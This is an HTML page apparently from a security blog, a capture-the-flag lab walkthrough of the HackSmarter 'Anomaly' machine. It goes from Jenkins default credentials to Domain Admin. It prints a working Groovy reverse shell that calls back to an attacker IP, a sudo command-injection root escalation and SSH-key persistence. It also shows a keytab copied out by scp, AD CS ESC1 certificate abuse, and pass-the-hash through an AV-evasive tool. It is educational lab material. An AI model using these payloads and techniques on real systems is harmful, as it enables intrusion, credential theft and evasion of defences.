@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Anomaly - HackSmarter Labs Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of Anomaly from HackSmarter Labs. Linux to Active Directory penetration testing covering Jenkins RCE, Kerberos keytab extraction, AD CS ESC1/ESC4 exploitation, and domain compromise." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Anomaly - HackSmarter Labs Walkthrough | Zerotrace" />
+  <meta property="og:description" content="Linux to Active Directory attack path covering Jenkins exploitation, Kerberos keytab abuse, and AD CS certificate template attacks for domain compromise." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/anomaly/bloodhound-anna-molly.png" />
+  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/anomaly.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Anomaly - HackSmarter Labs Walkthrough | Zerotrace" />
+  <meta name="twitter:description" content="Linux to Active Directory attack path covering Jenkins exploitation, Kerberos keytab abuse, and AD CS certificate template attacks for domain compromise." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/anomaly/bloodhound-anna-molly.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Page-specific table styling for machine info */
+    .machine-info {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1rem;
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 8px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info-item {
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+
+    .machine-info-item .label {
+      font-size: 0.85rem;
+      color: #8ecde8;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .machine-info-item .value {
+      font-weight: 600;
+      color: #c77dff;
+    }
+
+    .machine-info-item .value.difficulty-medium {
+      color: #ffaa00;
+    }
+
+    /* Attack chain visualization */
+    .attack-chain {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-left: 3px solid #c77dff;
+      border-radius: 6px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .attack-chain li {
+      padding-left: 2.5rem;
+      margin-bottom: 0.5rem;
+    }
+
+    /* Tools list styling */
+    .tools-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 0.75rem;
+      margin: 1rem 0;
+    }
+
+    .tools-grid li {
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 4px;
+      padding: 0.5rem 0.75rem 0.5rem 1.5rem;
+    }
+
+    /* ASCII attack path diagram styling */
+    .attack-diagram {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-left: 3px solid #c77dff;
+      border-radius: 6px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+    }
+
+    .attack-diagram pre {
+      margin: 0;
+      padding: 0;
+      background: transparent;
+      border: none;
+      box-shadow: none;
+    }
+
+    .attack-diagram code {
+      font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+      font-size: 0.85rem;
+      line-height: 1.4;
+      color: #c9d1d9;
+      background: transparent;
+      border: none;
+      padding: 0;
+    }
+
+    /* In-scope targets styling */
+    .targets-list {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1rem 0;
+    }
+
+    .targets-list li {
+      margin-bottom: 0.5rem;
+    }
+
+    /* Key takeaways list styling */
+    .takeaways-list {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.2);
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1rem 0;
+    }
+
+    .takeaways-list li {
+      margin-bottom: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu" hidden>
+          <li><a href="../writeups/welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="../writeups/staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="../writeups/buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="../writeups/arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="../writeups/midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="../writeups/banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="../writeups/ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="../writeups/slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machine Walkthroughs</button>
+        <ul class="submenu">
+          <li><a href="sharethepain.html">ShareThePain</a></li>
+          <li><a href="anomaly.html" aria-current="page">Anomaly</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Anomaly</h2>
+
+  <div class="machine-info">
+    <div class="machine-info-item">
+      <span class="label">Platform</span>
+      <span class="value">HackSmarter Labs</span>
+    </div>
+    <div class="machine-info-item">
+      <span class="label">Difficulty</span>
+      <span class="value difficulty-medium">Medium</span>
+    </div>
+    <div class="machine-info-item">
+      <span class="label">Key Topics</span>
+      <span class="value">Jenkins RCE, Kerberos Keytab, AD CS ESC1/ESC4, Pass-the-Hash</span>
+    </div>
+  </div>
+
+  <div class="disclaimer">
+    <strong>Disclaimer:</strong> This walkthrough is provided for <strong>educational purposes only</strong>. The techniques demonstrated should only be used in authorized penetration testing engagements or controlled lab environments. Unauthorized access to computer systems is illegal.
+  </div>
+
+  <h3>Overview</h3>
+  <p>This engagement simulates an external attacker progressing from an initial foothold on a Linux server to full Domain Administrator privileges over an Active Directory environment. The attack path involves exploiting a misconfigured Jenkins instance, pivoting through Kerberos credentials stored on the Linux host, and ultimately abusing vulnerable Active Directory Certificate Services (AD CS) templates to compromise the domain.</p>
+
+  <p><strong>In-Scope Targets:</strong></p>
+  <ul class="targets-list">
+    <li><strong>Ubuntu Server (10.1.167.185)</strong> - Initial foothold target</li>
+    <li><strong>Domain Controller (10.1.111.50)</strong> - Final target with active AV</li>
+  </ul>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Ubuntu Server Enumeration</h3>
+  <p>I started with a full port scan against the Ubuntu server:</p>
+  <pre><code>$ nmap -p- -T4 -sC -sV 10.1.167.185 -oN nmap_scan_ubuntu</code></pre>
+
+  <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
+8080/tcp open  http    Jetty 10.0.20
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+| http-robots.txt: 1 disallowed entry
+|_/</code></pre>
+
+  <p><strong>Key findings:</strong></p>
+  <ul>
+    <li>SSH on port 22</li>
+    <li>Jetty web server on port 8080 (commonly used by Jenkins)</li>
+  </ul>
+
+  <h3><span class="step">[Step 2]</span> Domain Controller Enumeration</h3>
+  <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.111.50 -oN nmap_scan_DC</code></pre>
+
+  <pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: anomaly.hsm)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+636/tcp   open  ssl/ldap
+3269/tcp  open  ssl/ldap
+3389/tcp  open  ms-wbt-server (RDP)
+9389/tcp  open  mc-nmf        .NET Message Framing</code></pre>
+
+  <p><strong>Key findings from the scan:</strong></p>
+  <ul>
+    <li>Domain: <code>anomaly.hsm</code></li>
+    <li>Domain Controller hostname: <code>ANOMALY-DC</code></li>
+    <li>SMB signing enabled and required</li>
+    <li>Standard AD ports exposed</li>
+  </ul>
+
+  <h2>Initial Access - Jenkins RCE</h2>
+
+  <h3><span class="step">[Step 3]</span> Jenkins Default Credentials</h3>
+  <p>Browsing to port 8080 on the Ubuntu server revealed a Jenkins login page. I tested default credentials and successfully authenticated with <code>admin:admin</code>.</p>
+
+  <div class="question">
+    <strong>What is Jenkins?</strong>
+  </div>
+  <div class="answer">
+    Jenkins is an open-source automation server commonly used for CI/CD pipelines. When misconfigured with default credentials, attackers can leverage its Script Console to execute arbitrary code on the underlying server.
+  </div>
+
+  <h3><span class="step">[Step 4]</span> Exploiting the Script Console</h3>
+  <p>After logging in, I navigated to <strong>Manage Jenkins</strong> and accessed the <strong>Script Console</strong>.</p>
+
+  <p><img src="../assets/anomaly/jenkins-script-console.png" alt="Jenkins Manage page showing Script Console option"></p>
+
+  <p>The Script Console allows execution of arbitrary Groovy code. I used a Groovy reverse shell payload while running a netcat listener on my attack machine:</p>
+
+  <pre><code>$ nc -nvlp 9001</code></pre>
+
+  <pre><code class="language-groovy">String host="10.200.26.123";
+int port=9001;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()>0)so.write(pi.read());
+    while(pe.available()>0)so.write(pe.read());
+    while(si.available()>0)po.write(si.read());
+    so.flush();po.flush();Thread.sleep(50);
+    try {p.exitValue();break;}catch (Exception e){}
+};
+p.destroy();s.close();</code></pre>
+
+  <pre><code>listening on [any] 9001 ...
+connect to [10.200.26.123] from (UNKNOWN) [10.1.167.185] 45432</code></pre>
+
+  <pre><code>> whoami
+jenkins</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Shell Upgrade</h3>
+  <p>I upgraded the basic shell to a fully interactive TTY:</p>
+
+  <pre><code>> python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+  <p>Background the shell with <code>Ctrl+Z</code>, then:</p>
+  <pre><code>$ stty raw -echo; fg</code></pre>
+
+  <p>Press Enter twice, then:</p>
+  <pre><code>$ export SHELL=/bin/bash
+$ export TERM=xterm-256color</code></pre>
+
+  <div class="question">
+    <strong>Why upgrade the shell?</strong>
+  </div>
+  <div class="answer">
+    A raw netcat shell lacks features like tab completion, command history, and proper signal handling. Upgrading to a PTY shell provides a more stable, interactive experience and prevents accidental disconnection from pressing <code>Ctrl+C</code>.
+  </div>
+
+  <h2>Privilege Escalation - Ubuntu Server</h2>
+
+  <h3><span class="step">[Step 6]</span> Enumerating Sudo Privileges</h3>
+  <pre><code>jenkins@ip-10-1-167-185:~$ sudo -l
+User jenkins may run the following commands on ip-10-1-167-185:
+    (ALL) NOPASSWD: /usr/bin/router_config</code></pre>
+
+  <p>The <code>jenkins</code> user can run <code>/usr/bin/router_config</code> as root without a password.</p>
+
+  <h3><span class="step">[Step 7]</span> Command Injection in router_config</h3>
+  <p>The <code>router_config</code> binary is vulnerable to command injection. I exploited it by injecting a bash command:</p>
+
+  <pre><code>jenkins@ip-10-1-167-185:~$ sudo /usr/bin/router_config 'test; /bin/bash'
+Welcome to Router Configuration Utility v1.2
+Applying configuration...
+Applying config from test</code></pre>
+
+  <pre><code># whoami
+root</code></pre>
+
+  <div class="question">
+    <strong>What is Command Injection?</strong>
+  </div>
+  <div class="answer">
+    Command injection occurs when user input is passed unsafely to a system shell. Here, the <code>router_config</code> binary likely uses the input in a command like <code>echo $input</code> without proper sanitization. The semicolon terminates the first command, and <code>/bin/bash</code> spawns a root shell.
+  </div>
+
+  <p><strong>User flag</strong> obtained from <code>/root/</code>.</p>
+
+  <h3><span class="step">[Step 8]</span> Establishing Persistence</h3>
+  <p>For easier access, I added my SSH public key to the root user's authorized_keys:</p>
+
+  <pre><code># echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAbgzJ34oT7llfAY49W+qFJJ2JG7HSod9qQPr33tkwH6 kali@kali" >> /root/.ssh/authorized_keys</code></pre>
+
+  <p>Now I could SSH directly as root:</p>
+  <pre><code>$ ssh -i ~/.ssh/id_ed25519 root@10.1.167.185
+root@ip-10-1-167-185:~#</code></pre>
+
+  <h2>Lateral Movement - Kerberos Keytab Discovery</h2>
+
+  <h3><span class="step">[Step 9]</span> Locating Kerberos Keytabs</h3>
+  <p>Since both machines are in scope and likely connected, I searched for Active Directory integration artifacts on the Ubuntu server.</p>
+
+  <pre><code># find / -name "*keytab*" -ls 2>/dev/null
+34876   4 -rw-r--r--   1 root root 80 Sep 21 22:36 /etc/krb5.keytab</code></pre>
+
+  <div class="question">
+    <strong>What is a Kerberos Keytab?</strong>
+  </div>
+  <div class="answer">
+    A keytab file contains Kerberos principal names and their encrypted keys. When a Linux server is joined to Active Directory, keytab files are used for passwordless authentication. If compromised, attackers can use them to authenticate as the stored principal without knowing the password.
+  </div>
+
+  <h3><span class="step">[Step 10]</span> Extracting Principal Information</h3>
+  <pre><code># klist -k -t /etc/krb5.keytab
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Timestamp         Principal
+---- ----------------- --------------------------------------------------------
+   0 01/01/70 00:00:00 Brandon_Boyd@ANOMALY.HSM</code></pre>
+
+  <p>I found a keytab for the domain user <code>Brandon_Boyd</code>.</p>
+
+  <h3><span class="step">[Step 11]</span> Obtaining a Kerberos Ticket</h3>
+  <pre><code># kinit Brandon_Boyd@ANOMALY.HSM -k -t /etc/krb5.keytab
+# klist
+Ticket cache: FILE:/tmp/krb5cc_0
+Default principal: Brandon_Boyd@ANOMALY.HSM
+
+Valid starting     Expires            Service principal
+12/30/25 10:06:18  12/30/25 20:06:18  krbtgt/ANOMALY.HSM@ANOMALY.HSM
+        renew until 12/31/25 10:06:18</code></pre>
+
+  <p>I transferred the credential cache and keytab to my attack machine:</p>
+  <pre><code># scp -P 2222 /tmp/krb5cc_0 kali@10.200.26.123:/tmp/
+# scp -P 2222 /etc/krb5.keytab kali@10.200.26.123:/tmp/</code></pre>
+
+  <h3><span class="step">[Step 12]</span> Extracting Hashes from Keytab</h3>
+  <p>Using <code>keytabextract.py</code> from the KeyTabExtract tool, I extracted the AES256 hash:</p>
+
+  <pre><code>$ python3 keytabextract.py /tmp/krb5.keytab
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : ANOMALY.HSM
+        SERVICE PRINCIPAL : Brandon_Boyd/
+        AES-256 HASH : f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52</code></pre>
+
+  <h2>Domain Enumeration</h2>
+
+  <h3><span class="step">[Step 13]</span> Validating Kerberos Authentication</h3>
+  <p>I set up my attack machine to use the stolen credential cache:</p>
+
+  <pre><code>$ export KRB5CCNAME=/tmp/krb5cc_0</code></pre>
+
+  <p><img src="../assets/anomaly/kerberos-smb-auth.png" alt="Successful SMB authentication using Kerberos ticket"></p>
+
+  <h3><span class="step">[Step 14]</span> User Enumeration via SMB</h3>
+  <p>Using NetExec with Kerberos authentication, I enumerated domain users:</p>
+
+  <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd --use-kcache --users</code></pre>
+
+  <pre><code>-Username-         -Last PW Set-       -BadPW- -Description-
+Administrator      2025-09-17 12:01:03 0       Built-in account for administering the computer/domain
+Guest              &lt;never&gt;             0       Built-in account for guest access
+krbtgt             2025-09-21 11:54:56 0       Key Distribution Center Service Account
+Brandon_Boyd       2025-11-12 20:30:05 0       3edc4rfv#EDC$RFV
+anna_molly         2025-11-12 20:29:16 0</code></pre>
+
+  <p>The description field for <code>Brandon_Boyd</code> contained a password: <code>3edc4rfv#EDC$RFV</code></p>
+
+  <div class="question">
+    <strong>Why check user descriptions?</strong>
+  </div>
+  <div class="answer">
+    Administrators sometimes store passwords or sensitive notes in the description field of AD user accounts, assuming it is not visible to other users. However, by default, any authenticated domain user can read these fields via LDAP queries.
+  </div>
+
+  <p><img src="../assets/anomaly/user-enum-password.png" alt="User enumeration showing password in description field"></p>
+
+  <h3><span class="step">[Step 15]</span> Credential Validation</h3>
+  <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd -p '3edc4rfv#EDC$RFV'
+SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:3edc4rfv#EDC$RFV</code></pre>
+
+  <h3><span class="step">[Step 16]</span> BloodHound Collection</h3>
+  <p>I collected Active Directory data for analysis:</p>
+
+  <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' --bloodhound --collection All --dns-server 10.1.111.50</code></pre>
+
+  <p>BloodHound analysis did not reveal any direct privilege escalation paths, so I pivoted to checking for AD CS vulnerabilities.</p>
+
+  <h2>Domain Privilege Escalation - AD CS Exploitation</h2>
+
+  <h3><span class="step">[Step 17]</span> Certificate Template Enumeration</h3>
+  <p>Using Certipy, I scanned for vulnerable certificate templates:</p>
+
+  <pre><code>$ certipy find -u Brandon_Boyd@anomaly.hsm -p '3edc4rfv#EDC$RFV' -dc-ip 10.1.111.50 -vulnerable</code></pre>
+
+  <div class="question">
+    <strong>What is AD CS (Active Directory Certificate Services)?</strong>
+  </div>
+  <div class="answer">
+    AD CS is Microsoft's PKI implementation that issues digital certificates for authentication, encryption, and code signing. Misconfigurations in certificate templates can allow attackers to request certificates for other users, including administrators, leading to domain compromise.
+  </div>
+
+  <p><strong>Key findings from the Certipy output:</strong></p>
+
+  <pre><code>Certificate Templates
+  Template Name                       : CertAdmin
+  Client Authentication               : True
+  Enrollee Supplies Subject           : True
+  Certificate Name Flag               : EnrolleeSuppliesSubject
+
+  Permissions
+    Full Control Principals           : ANOMALY.HSM\Domain Computers
+    Write Owner Principals            : ANOMALY.HSM\Domain Computers
+    Write Dacl Principals             : ANOMALY.HSM\Domain Computers
+
+  [!] Vulnerabilities
+    ESC1 : Enrollee supplies subject and template allows client authentication.
+    ESC4 : User has dangerous permissions.</code></pre>
+
+  <div class="question">
+    <strong>What are ESC1 and ESC4?</strong>
+  </div>
+  <div class="answer">
+    <ul>
+      <li><strong>ESC1</strong>: A certificate template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN). This means an attacker can request a certificate for any user, including Domain Admins.</li>
+      <li><strong>ESC4</strong>: Users have write permissions over the certificate template itself, allowing modification of template properties to enable further attacks.</li>
+    </ul>
+  </div>
+
+  <p>The <code>CertAdmin</code> template is vulnerable, and <code>Domain Computers</code> have the necessary permissions to exploit it.</p>
+
+  <h3><span class="step">[Step 18]</span> Checking Machine Account Quota</h3>
+  <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -M maq
+MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
+
+  <div class="question">
+    <strong>What is Machine Account Quota (MAQ)?</strong>
+  </div>
+  <div class="answer">
+    By default, any authenticated domain user can add up to 10 computer accounts to the domain. This is controlled by the <code>ms-DS-MachineAccountQuota</code> attribute. Attackers exploit this to create computer accounts they fully control.
+  </div>
+
+  <h3><span class="step">[Step 19]</span> Adding a Computer Account</h3>
+  <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass 'Zerotrace123!' \
+    ANOMALY.HSM/Brandon_Boyd:'3edc4rfv#EDC$RFV' -dc-ip 10.1.111.50
+[*] Successfully added machine account BRANDON-PC$ with password Zerotrace123!.</code></pre>
+
+  <p>Verification:</p>
+  <pre><code>$ nxc smb 10.1.111.50 -u 'BRANDON-PC$' -p 'Zerotrace123!'
+SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!</code></pre>
+
+  <h3><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
+  <p>I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
+
+  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
+    -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
+    -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
+    -upn 'administrator@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-500'</code></pre>
+
+  <pre><code>$ certipy auth -pfx administrator.pfx -dc-ip 10.1.111.50
+[-] Got error while trying to request TGT: KDC_ERR_CLIENT_REVOKED</code></pre>
+
+  <p>The <code>KDC_ERR_CLIENT_REVOKED</code> error indicates the Administrator account is disabled or locked.</p>
+
+  <h3><span class="step">[Step 21]</span> Finding Alternative Domain Admin</h3>
+  <p>Using BloodHound, I identified another Domain Admin: <code>anna_molly</code>.</p>
+
+  <p><img src="../assets/anomaly/bloodhound-anna-molly.png" alt="BloodHound showing anna_molly as Domain Admin with SID"></p>
+
+  <h3><span class="step">[Step 22]</span> Requesting Certificate as anna_molly</h3>
+  <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
+    -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
+    -ca 'anomaly-ANOMALY-DC-CA-2' -template CertAdmin \
+    -upn 'anna_molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'
+
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'anna_molly@anomaly.hsm'
+[*] Wrote certificate and private key to 'anna_molly.pfx'</code></pre>
+
+  <h3><span class="step">[Step 23]</span> Authenticating and Extracting Hash</h3>
+  <pre><code>$ certipy auth -pfx anna_molly.pfx -dc-ip 10.1.111.50
+[*] Got TGT
+[*] Saving credential cache to 'anna_molly.ccache'
+[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e</code></pre>
+
+  <div class="question">
+    <strong>What is UnPAC-the-Hash?</strong>
+  </div>
+  <div class="answer">
+    When authenticating with a certificate via PKINIT, Certipy can recover the user's NTLM hash from the PAC (Privilege Attribute Certificate) in the TGT. This technique is called UnPAC-the-hash and allows Pass-the-Hash attacks.
+  </div>
+
+  <p><img src="../assets/anomaly/netexec-pwned.png" alt="NetExec confirming Pwn3d status with anna_molly hash"></p>
+
+  <h2>Domain Controller Access - AV Evasion</h2>
+
+  <h3><span class="step">[Step 24]</span> Using wmiexec2 for Evasion</h3>
+  <p>Since the Domain Controller has active antivirus, I used <code>wmiexec2</code>, an obfuscated version of wmiexec designed to evade detection.</p>
+
+  <div class="question">
+    <strong>Why wmiexec2?</strong>
+  </div>
+  <div class="answer">
+    Standard tools like psexec or wmiexec have well-known signatures that most AV solutions detect. wmiexec2 uses obfuscation techniques to bypass these detections while maintaining the same functionality.
+  </div>
+
+  <p><strong>Tool:</strong> <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener">wmiexec2 on GitHub</a></p>
+
+  <pre><code>$ python3 wmiexec2.py anomaly.hsm/anna_molly@10.1.111.50 \
+    -hashes aad3b435b51404eeaad3b435b51404ee:be4bf3131851aee9a424c58e02879f6e
+
+[*] SMBv3.0 dialect used
+[*] Launching wmiexec2
+C:\></code></pre>
+
+  <h2>Root Flag</h2>
+  <pre><code>C:\> cd C:\Users\Administrator\Desktop
+C:\Users\Administrator\Desktop> type root.txt
+[FLAG REDACTED]</code></pre>
+
+  <h2>Attack Path Summary</h2>
+  <div class="attack-diagram">
+    <pre><code>Jenkins (Default Creds: admin:admin)
+         |
+         v
+Groovy RCE --> jenkins user shell
+         |
+         v
+sudo router_config --> Command Injection --> root on Ubuntu
+         |
+         v
+Kerberos Keytab --> Brandon_Boyd credentials
+         |
+         v
+User Description Field --> Brandon_Boyd password
+         |
+         v
+AD CS ESC1 (CertAdmin template) + Machine Account Quota
+         |
+         v
+Add Computer Account --> Request cert as anna_molly (Domain Admin)
+         |
+         v
+UnPAC-the-Hash --> anna_molly NTLM hash
+         |
+         v
+Pass-the-Hash (wmiexec2 for AV evasion) --> Domain Controller</code></pre>
+  </div>
+
+  <h2>Key Takeaways</h2>
+  <ol class="takeaways-list">
+    <li><strong>Default credentials</strong> on Jenkins provided initial access - always change default passwords</li>
+    <li><strong>Kerberos keytabs</strong> on Linux servers joined to AD can expose domain credentials</li>
+    <li><strong>Passwords in description fields</strong> are a common misconfiguration that LDAP queries can reveal</li>
+    <li><strong>AD CS misconfigurations</strong> (ESC1/ESC4) remain a critical path to domain compromise</li>
+    <li><strong>Machine Account Quota</strong> defaults (10) allow any authenticated user to add computer accounts</li>
+    <li><strong>AV evasion</strong> tools like wmiexec2 can bypass endpoint protection when standard tools are blocked</li>
+  </ol>
+
+  <h2>Tools Used</h2>
+  <ul class="tools-grid">
+    <li><a href="https://nmap.org/" target="_blank" rel="noopener">Nmap</a> - Network scanning</li>
+    <li><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener">NetExec (nxc)</a> - SMB/LDAP enumeration</li>
+    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy</a> - AD CS enumeration and exploitation</li>
+    <li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a> - addcomputer.py for machine account creation</li>
+    <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a> - Active Directory attack path analysis</li>
+    <li><a href="https://github.com/sosdave/KeyTabExtract" target="_blank" rel="noopener">KeyTabExtract</a> - Kerberos keytab hash extraction</li>
+    <li><a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener">wmiexec2</a> - AV-evasive WMI execution</li>
+  </ul>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
